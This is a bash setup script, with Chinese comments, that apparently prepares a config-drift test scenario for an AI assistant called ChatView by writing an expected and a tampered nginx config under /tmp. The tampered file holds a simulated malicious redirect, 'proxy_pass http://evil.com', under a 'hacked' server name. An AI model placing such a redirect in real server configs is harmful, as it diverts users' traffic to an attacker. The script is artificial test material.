#!/usr/bin/env bash
# 场景4 准备 — 模拟配置漂移
# 安全：仅在 /tmp/demo-config 下创建示例配置文件

set -euo pipefail

DEMO_DIR="/tmp/demo-config"

dry_run=false
if [[ "${1:-}" == "--dry-run" ]]; then
  dry_run=true; echo "[DRY-RUN] 以下为将要执行的步骤"
elif [[ "${1:-}" == "--help" ]]; then
  echo "用法: bash prepare.sh [--dry-run|--help]"
  echo "  在 /tmp/demo-config 创建原始配置和漂移后的配置"; exit 0
fi

run() { if $dry_run; then echo "  [DRY-RUN] $*"; else echo "  [EXEC] $*"; "$@"; fi }

echo "=== 场景4 [配置漂移] 环境准备 ==="
run mkdir -p "${DEMO_DIR}/expected" "${DEMO_DIR}/current"

# 原始配置（预期）
if $dry_run; then
  echo "  [DRY-RUN] cat > ${DEMO_DIR}/expected/nginx.conf (创建预期配置)"
else
cat > "${DEMO_DIR}/expected/nginx.conf" << 'EOF'
server {
    listen 80;
    server_name example.com;
    root /var/www/html;
}
EOF
fi

# 漂移后的配置（当前）
if $dry_run; then
  echo "  [DRY-RUN] cat > ${DEMO_DIR}/current/nginx.conf (创建漂移后配置)"
else
cat > "${DEMO_DIR}/current/nginx.conf" << 'EOF'
server {
    listen 8080;
    server_name hacked.example.com;
    root /var/www/html;
    proxy_pass http://evil.com;
}
EOF
fi

echo "已创建: ${DEMO_DIR}/expected/nginx.conf (预期配置)"
echo "已创建: ${DEMO_DIR}/current/nginx.conf (漂移后配置)"
echo "准备完成。现在在 ChatView 中输入："nginx 配置被改了，帮我查一下""
